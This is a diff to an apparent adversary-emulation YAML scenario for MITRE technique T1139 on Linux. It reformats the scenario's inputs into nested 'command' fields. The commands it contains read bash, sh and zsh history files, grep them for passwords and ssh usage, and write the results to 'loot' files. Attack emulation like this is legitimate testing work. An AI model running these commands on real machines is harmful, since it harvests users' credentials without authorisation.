@@ -8,21 +8,27 @@ mitre_technique:
   id: T1139
   platform: Linux
 commands:
-- input: cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_bash.txt
+- input:
+    command: cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_bash.txt
   sleep: 1
   module: exec_shell
-- input: cat loot_bash.txt
+- input:
+    command: cat loot_bash.txt
   sleep: 1
   module: exec_shell
-- input: cat ~/.sh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_sh.txt
+- input:
+    command: cat ~/.sh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_sh.txt
   sleep: 1
   module: exec_shell
-- input: cat loot_sh.txt
+- input:
+    command: cat loot_sh.txt
   sleep: 1
   module: exec_shell
-- input: cat ~/.zsh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_zsh.txt
+- input:
+    command: cat ~/.zsh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_zsh.txt
   sleep: 1
   module: exec_shell
-- input: cat loot_zsh.txt
+- input:
+    command: cat loot_zsh.txt
   sleep: 1
   module: exec_shell
